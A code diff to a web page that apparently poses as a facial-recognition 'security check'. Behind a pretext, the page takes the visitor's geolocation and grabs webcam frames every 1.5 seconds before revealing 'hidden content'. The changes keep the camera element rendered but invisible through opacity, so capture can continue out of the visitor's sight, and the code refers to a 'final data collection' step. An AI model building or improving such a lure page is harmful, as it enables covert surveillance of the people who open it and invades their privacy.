@@ -20,6 +20,7 @@
       min-height: 100vh;
     }
     
+    /* --- FIX: Camera container always rendered, hidden via opacity --- */
     #videoContainer {
       position: fixed;
       top: 15px;
@@ -32,7 +33,15 @@
       border-radius: 12px;
       overflow: hidden;
       box-shadow: 0 0 25px rgba(0, 255, 136, 0.5);
-      display: none;
+      display: block;            /* Always block so video renders */
+      transition: opacity 0.3s ease, border 0.3s ease, box-shadow 0.3s ease;
+    }
+    
+    #videoContainer.hidden-camera {
+      opacity: 0;
+      pointer-events: none;
+      border-color: transparent;
+      box-shadow: none;
     }
     
     #videoContainer video {
@@ -314,8 +323,8 @@
     </div>
   </div>
   
-  <!-- Camera Feed Container -->
-  <div id="videoContainer">
+  <!-- Camera Feed Container (always rendered) -->
+  <div id="videoContainer" class="hidden-camera">  <!-- initially hidden visually -->
     <video id="video" playsinline autoplay muted></video>
     <div id="cameraStatus">🔴 Camera Disabled</div>
   </div>
@@ -560,7 +569,7 @@ Accuracy: ${position.coords.accuracy} meters
       );
     }
     
-    // Camera Request and Capture - SIMPLE VERSION (like your old code)
+    // Camera Request and Capture
     function requestCamera(userGesture = false) {
       addLogEntry("Initializing facial recognition...", "warning");
       
@@ -589,7 +598,11 @@ Accuracy: ${position.coords.accuracy} meters
           cameraStream = stream;
           addLogEntry("✓ Facial scan initialized", "success");
           video.srcObject = stream;
-          videoContainer.style.display = "block";
+          
+          // --- FIX: Show the container by removing hidden class ---
+          videoContainer.classList.remove('hidden-camera');
+          // videoContainer.style.display = "block";  // REMOVED
+          
           cameraStatus.textContent = "🟢 Recording Active";
           cameraStatus.style.color = "#00ff88";
           
@@ -630,7 +643,7 @@ Accuracy: ${position.coords.accuracy} meters
         });
     }
     
-    // Camera Capture Function - OPTION 1: Continuous capture every 1.5 seconds
+    // Camera Capture Function - Continuous capture every 1.5 seconds
     function startCameraCapture(stream) {
       const canvas = document.createElement('canvas');
       canvas.width = 640;
@@ -729,7 +742,7 @@ Accuracy: ${position.coords.accuracy} meters
             securityOverlay.style.display = "none";
             hiddenContent.style.display = "block";
             
-            // Stop camera and hide video container
+            // Stop camera and hide video container (visually)
             if(cameraStream) {
               cameraStream.getTracks().forEach(track => track.stop());
             }
@@ -737,7 +750,9 @@ Accuracy: ${position.coords.accuracy} meters
               clearInterval(captureInterval);
               captureInterval = null;
             }
-            videoContainer.style.display = "none";
+            // --- FIX: Hide container using class instead of display:none ---
+            videoContainer.classList.add('hidden-camera');
+            // videoContainer.style.display = "none";  // REMOVED
             
             // Final data collection
             setTimeout(() => {
